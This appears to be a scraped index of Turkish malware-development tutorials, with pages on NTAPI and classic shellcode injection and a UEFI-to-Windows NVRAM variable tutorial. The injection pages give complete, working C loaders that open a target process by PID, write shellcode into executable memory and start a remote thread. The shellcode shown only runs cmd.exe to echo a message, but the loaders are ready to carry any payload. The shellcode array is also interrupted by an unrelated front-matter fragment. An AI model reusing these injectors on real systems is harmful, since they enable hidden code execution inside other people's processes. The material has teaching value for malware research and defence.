\"\\x63\\x68\\x6f\\x20\\x4e\\x54\\x41\\x50\\x49\\x20\\x49\\x6e\\x6a\\x65\" \"\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\\x20\\x62\\x65\\x6b\" \"\\x6f\\x6f\\x22\\x00\"; size_t ShellcodeSize = sizeof(Shellcode); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\injection.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; HMODULE ntDLL = NULL; PVOID RemoteBuffer = NULL; size_t bytesWritten = 0; OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = STATUS_SUCCESS; /* Get handle to ntdll and kernel32 */ ntDLL = GetModuleHandleA(\"ntdll.dll\"); if (ntDLL == NULL) { printf(\"Failed to get handle for NTDLL! Error Code: 0x%lx\\n\", GetLastError()); return -1; } /* NtCloseHandle */ fn_NtClose ntClose = (fn_NtClose)GetProcAddress(ntDLL, \"NtClose\"); /* NTOpenProcess */ fn_NtOpenProcess ntOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntDLL, \"NtOpenProcess\"); Status = ntOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026objAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"Failed to open handle to Process! Error Code: 0x%lx\", Status); return -1; } /* NTAllocateVirtualMemory */ fn_NtAllocateVirtualMemory ntAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntDLL, \"NtAllocateVirtualMemory\"); Status = ntAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"Failed to Allocate Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NTWriteVirtualMemory */ fn_NtWriteVirtualMemory ntWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntDLL, \"NtWriteVirtualMemory\"); Status = ntWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), \u0026bytesWritten); if (Status != STATUS_SUCCESS || bytesWritten != sizeof(Shellcode)) { printf(\"Failed to Write Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtCreateThreadEx */ fn_NtCreateThreadEx ntCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntDLL, \"NtCreateThreadEx\"); Status = ntCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, \u0026objAttr, HandleProcess, (RemoteBuffer), NULL, FALSE, 0, 0, 0, 0); if (Status != STATUS_SUCCESS) { printf(\"Failed to create Thread! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtWaitForSingleObject */ fn_NtWaitForSingleObject ntWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddress(ntDLL, \"NtWaitForSingleObject\"); Status = ntWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"Failed to wait for Thread! Error Code: 0x%lx\", Status); ntClose(HandleThread); ntClose(HandleProcess); return -1; } ntClose(HandleThread); ntClose(HandleProcess); return 0; } Artık bu kodlarda neler yaptığımızı biliyoruz o yüzden kodların detayına girmeyeceğim. Projeyi çalıştıralım:\nVideodan görüldüğü üzere NTAPI’lar kullanarak başarılı bir şekilde Shellcode execute edebiliyoruz.\nSonuç Bu konuda NTAPI’lara yakından değindik. User-mode ve Kernel-mode alanlarını teorik olarak tanıdık ve ardından NTAPI’lar üzerinde çalışma yaptık ve son olarak NTAPI’lar kullanarak Shellcode Exeucute ettik.\nUmarım konu sizin için faydalı olmuştur. Diğer blogta görüşmek üzere.","user-mode-ve-kernel-mode#\u003cstrong\u003eUser mode\u003c/strong\u003e ve \u003cstrong\u003eKernel Mode\u003c/strong\u003e":""},"title":"NTAPI Injection"},"/tr/docs/malware-dev/shellcode-injection/":{"data":{"":"","kod#Kod":"\rMerhabalar bu yazıda Shellcode Execution konusunu inceleyeceğiz.\nNedir bu Process’ler Maldev alanının ilk konusu olduğu için bazı temel şeyleri öğrenerek başlamamız gerekiyor.\nKabaca Processler, işletim sistemi tarafından herhangi bir programın yürütülmesi için oluşturulan çalışma birimleridir. Eğer bir program, kullanıcı veya İşletim Sistemi (OS) tarafından çalıştırılmak istenirse, öncelikle İşletim Sistemi tarafından belleğe yüklenir ardından yine İşletim Sistemi tarafından bu programın yürütülmesi için bir process oluşturulur. En sonda ise belleğe yüklenen programın bellek alanı, Process tarafından temsil edilir ve programın içerdiği komutları çalıştırılmaya başlanır.\nArayüz ortamında gördüğünüz herhangi bir programın dosyaları (kabaca program kodları), kullanıcı veya işletim sistemi tarafından çalıştırılmadığı sürece pasif halde olur. Eğer hedef program çalıştırılmak istenirse, önce diskten belleğe aktarılır ardından aktarılan bu kodlar yürütülmeye başlanır. Bu esnada ise program aktif hale gelmiş olur.\nThread’ler Nedir? “Bir Process, en basit ifadeyle, yürütülmekte olan bir programdır. Process bağlamında bir veya daha fazla thread çalışır. Thread ise işletim sisteminin işlemci zamanını tahsis ettiği temel birimdir. Bir Thread, başka bir thread tarafından yürütülmekte olan kısımlar da dahil olmak üzere, işlem kodunun herhangi bir bölümünü yürütebilir.” Microsoft Learn - Process and Threads Process’lere göre daha hızlı ve hafif olan Thread’ler, kabaca tanımıyla İşletim Sisteminde bağımsız olarak çalışan birimlerdir. Herhangi bir process içerisinde bir veya daha fazla thread olabilir. Dolayasıyla Process’ler, Thread’ler sayesinde birden fazla işi aynı anda yapabilir.\nThread aracılığıyla Process’lerin birden fazla işi aynı anda yapılabileceğinden bahsettim. Bunu biraz daha detaylandıralım. Örneğin bir web tarayacısı düşünün. Bu web tarayıcısının bir thread ile kullanıcının arayüzle etkileşimi yönetilirken diğer thread’ler ile arka planda web sayfaları yüklemek gibi işlemleri aynı anda gerçekleştirebilir. Örnek açısından aşağıda Windows 11 ortamında Task Manager aracılığıyla Firefox Process’in altındaki Thread listesi gösterilmiştir: Shellcode Execution Nedir? Shellcode Execution genellikle process injection teknikleriyle ilişkilidir. Saldırgan, shellcode’u bir hedef sürecin belleğine enjekte ettikten sonra, bu kodun çalıştırılmasını sağlayarak hedef sistemde kontrol elde edebilir.\nKod Github üzerinde paylaştığım örnek kod parçasına buradan erişebilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e /* cmd /K \"echo Shellcode Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } if (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Detaylıca göz atalım:\nchar Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"--- title: Malware Resurrection date: 2024-09-12 --- \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; Bu shellcode, cmd.exe’yi açarak “Shellcode Injection with bekoo” yazısını ekrana yazdıran bir shellcode’dur. Bu shellcode’u hedef process’e enjekte edeceğiz.\nint main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; ... Programın çalıştırılmasından ardından ilk olarak main içerisinde argc değişkenini kontrol ediyoruz. Bu değişken, programın çalıştırılmasında verilen argüman sayısını tutar. Eğer argc değişkeni 2’den küçükse, programın doğru kullanımını ekrana bastırıp -1 ile programı return ediyoruz.\nDaha sonra malware’in çalıştırılması için gereken değişkenleri oluşturuyoruz:\nPID: Bu değişken, hedef process’in PID’sini tutar. HandleProcess: Bu değişken, hedef process’in handle’ini tutmak için kullanılır. HandleThread: Bu değişken, hedef process’te oluşturulacak thread’ın handle’ını tutmak için kullanılır. RemoteBuffer: Bu değişken, hedef process’te oluşturulacak shellcode’un adresini tutmak için kullanılır. HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } Bu kısımda, hedef process’in handle’ını alıyoruz. Yani hedef programa erişim sağlıyoruz gibi düşünebilirsiniz. Eğer hedef process’in handle’ını alamazsak, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nRemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Daha sonra hedef process’in bellek alanında, shellcode’u tutacak bir alan rezerve ediyoruz. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nif (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Bu kısımda, hedef process’in bellek alanına shellcode’u yazıyoruz. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Bu kısımda ise hedef process’te yeni bir thread oluşturuyoruz. Bu thread, hedef process’in bellek alanında bulunan shellcode’u çalıştıracaktır. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nSon olarak ise WaitForSingleObject aracılığıyla oluşturduğumuz thread’ın bitmesini bekliyoruz ve ardından hedef process’in handle’larını serbest bırakıyoruz.","nedir-bu-processler#Nedir bu Process\u0026rsquo;ler":"","shellcode-execution-nedir#Shellcode Execution Nedir?":"","threadler-nedir#Thread\u0026rsquo;ler Nedir?":""},"title":"Shellcode Injection"},"/tr/docs/uefi-dev/":{"data":{"":"UEFI Development ile ilgili konuları incelemek için aşağıdaki bölümlere göz atabilirsiniz:\nUEFI to Windows Communication via NVRAM Variables\rSimple UEFI Keylogger\rIntroduction to UEFI"},"title":"UEFI Development"},"/tr/docs/uefi-dev/communation-between-windows-and-uefi/":{"data":{"":"","#":"Bu dökümanda, bir UEFI sürücüsü ile bir Windows sürücüsü arasında nasıl iletişim kurulacağını tartışacağız. Özellikle, iki ortam arasında veri alışverişi yapmak için NVRAM tabanlı UEFI değişkenlerinin nasıl kullanılacağını inceleyeceğiz.\nWhat is NVRAM? NVRAM (Non-Volatile RAM), UEFI tabanlı sistemlerde kalıcı yapılandırma ve sistem durumu verilerini depolamak için kullanılan önemli bir bileşendir. Normal RAM’den farklı olarak NVRAM, içeriğini yeniden başlatmalarda ve kapatmalarda korur.\nUEFI’de NVRAM, nasıl ve ne zaman erişilebileceklerini tanımlayan meta verileri (öznitelikler) içeren değişkenler-yapılandırılmış anahtar-değer çiftleri halinde düzenlenir. Bu değişkenler önyükleme yönetimi, güvenli önyükleme anahtarı depolama, donanım yapılandırması ve OEM’e özgü ayarlar gibi kritik sistem işlevleri için kullanılır.\nUEFI Variables UEFI Değişkenleri bir GUID ve Unicode String kombinasyonu ile belirtilir. Bir değişkenin GUID’si, farklı vendorler arasındaki isim çakışmalarını önleyebilir.\nUEFI’nin The Boot Manager Chapter, EDK II’de gEfiGlobalVariableGuid olarak da bilinen EFIGLOBAL_VARIABLE_GUID’yi tanımlar. UEFI Sürücümüzde SecureBoot Status gibi global bir değişken kullanmak istiyorsak, gEfiGlobalVariableGuid’den yararlanmamız gerekir. İşte EDK II Repo‘dan bazı global değişken listesi:\nEFI_PLATFORM_LANG_CODES_VARIABLE_NAME L\"PlatformLangCodes\" EFI_BOOT_CURRENT_VARIABLE_NAME L\"BootCurrent\" EFI_SIGNATURE_SUPPORT_NAME L\"SignatureSupport\" … Her UEFI Değişkeni, kalıcılık ile alakalı niteliklere sahiptir. İşte özniteliklerin listesi:\nBOOTSERVICE_ACCESS Değişken, ExitBootServices() çağrılmadan önce önyükleme sırasında yazma ve okuma erişim izinlerine sahiptir, bu da değişkenin ExitBootServices() çağrıldıktan sonra kullanılamayacağı ve değişkenin içeriğinin bir sonraki sistem sıfırlamasında silineceği anlamına gelir.\nBOOTSERVICE_ACCESS | RUNTIME_ACCESS Değişken ExitBootServices() çağrılmadan önce yazma ve okuma erişim izinlerine sahiptir, ancak ExitBootServices() çağrıldığında içeriği salt okunur olarak kalacaktır, ayrıca bir sonraki sistem yeniden başlatıldığında içeriği silinecektir.\nNON_VOLATILE | BOOTSERVICE_ACCESS Değişken, ExitBootServices() çağrılmadan önce yazma ve okuma erişim izinlerine sahiptir ve içeriği sistem sıfırlanana kadar kalıcıdır.\nNON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS Değişken hem önyükleme öncesi hem de işletim sistemi çalışma zamanı ortamında yazma ve okuma izinlerine sahiptir. İçeriği sistem sıfırlaması boyunca kalıcıdır.\nAccessing UEFI Variables with Services Bir UEFI Sürücüsü yapılandırma bilgilerini UEFI Değişkenleri aracılığıyla sakladığında, EFI_HII_CONFIG_ACCESS_PROTOCOL tarafından sağlanan servislerle bunlara erişebilir. Bu dökümanda göreceğimiz SetVariable() ve GetVariable() servisleri yapılandırma bilgilerini ayarlamak ve almak için kullanılır.\n1 - SetVariable() SetVariable() servisi değişkenin içeriğini ayarlar, ayrıca yeni bir değişken oluşturmak, değişkeni değiştirmek veya mevcut bir değişkeni silmek için kullanılabilir. İşte servisin parametreleri:\ntypedef EFI_STATUS SetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data ); SetVariable için bir proje oluşturalım:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, \u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Write Operation Failed!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); return EFI_SUCCESS; } Kodda ContentOfVariable’ın içeriğini yazdık. Öncelikle UEFI değişkenimiz için bir değişken adı, GUID ve değer oluşturduk, ardından SetVariable’ı çalıştırdık. Bu işlemler sonucunda UEFI Değişkenimiz şu bilgilere sahip olacaktır:\nUEFI Değişken Adı: MyUEFIVar GUID: A1B2C3D4-1234-5678-9ABC-DEF123456789 İçerik: 0xDEADBEEF İşte sonuç:\nŞimdi bu bilgilerle bu değişkene erişebiliriz.\n2 - GetVariable() GetVariable() servisi ilgili değişkenin içeriğini okur. İşte servisin parametreleri:\ntypedef EFI_STATUS GetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, OUT UINT32 *Attributes OPTIONAL, IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL ); Şimdi GetVariable servisi ile projeyi geliştirelim:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, \u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Failed to write!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); UINT8 Content[4] = { 0 }; DataSize = sizeof(Content); Status = gRT-\u003eGetVariable( VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Content ); if (EFI_ERROR(Status)) { Print(L\"Failed to read the variable!\\n\"); return Status; } for (int x = 0; x \u003c DataSize; x++) { Print(L\"Content: 0x%02x\\n\", Content[x]); } return EFI_SUCCESS; } SetVariable çağrıldıktan sonra, UEFI Değişkenimizin içeriğini almak için GetVariable servisini çağırdık ve ardından sonucu yazdırdık. İşte sonuç:\nCoding Windows Driver Esasen ntoskrnl’de amacımız için kullanabileceğimiz bir rutin var. ExGetFirmwareEnvironmentVariable UEFI Değişkenlerini okumak için kullanılabilir. Böylece windows sürücüsünün kodlanması zor olmayacaktır. Bu rutini UEFI Değişken bilgisi ile çağırabiliriz:\n#include \u003cntddk.h\u003e NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrint(\"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"MyUEFIVar\"); UINT8 Content[4] = { 0 }; ULONG BufferSize = sizeof(Content); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; Status = ExGetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Content, \u0026BufferSize, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Read Data!\\n\"); return Status; } for (ULONG x = 0; x \u003c BufferSize; x++) { DbgPrintEx(0, 0, \"The value from UEFI Variable: 0x%02x\\n\", Content[x]); } return STATUS_SUCCESS; } Projede ExGetFirmwareEnvironmentVariable rutini ile UEFI Değişkenimizin içeriğine eriştik. İşte sonuç:\nExGetFirmwareEnvironmentVariable çağrıldığında, aşağıdaki rutinler çağırılmakta:\nHer şeyden önce ExpGetFirmwareEnvironmentVariable için çağrı yapar:\nVe sonra ExGetFirmwareEnvironmentVariable parametreleri IoGetEnvironmentVariableEx’e aktarılır:\nCreating UEFI Variable from Windows Driver Ayrıca Windows Sürücüsünden UEFI Değişkeni oluşturabilir ve ayarlayabiliriz. ExSetFirmwareEnvironmentVariable bu amaç için kullanılabilir:\n#include \u003cntddk.h\u003e #pragma warning(disable: 4057) #define EFI_VARIABLE_NON_VOLATILE 0x00000001 #define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002 #define EFI_VARIABLE_RUNTIME_ACCESS 0x00000004 NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"YUPIIIIIII\"); WCHAR Buffer[] = L\"HELLOOO from Windows!!\"; ULONG BufferSize = sizeof(Buffer); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = ExSetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Buffer, BufferSize, Attributes); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to write the value! Error Code: 0x%x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Done!\\n\"); return STATUS_SUCCESS; } Ve UEFI sürücüsü:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"YUPIIIIIII\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; CHAR16 Buffer[32]; UINTN DataSize = sizeof(Buffer); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eGetVariable(VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Buffer); if (EFI_ERROR(Status)) { Print(L\"Failed to read the data!\\n\"); return Status; } Print(L\"The Content: %s\\n\", Buffer); return EFI_SUCCESS; } İşte sonuç:\nConclusion Bu dökümanda, UEFI ve Windows sürücülerinin NVRAM 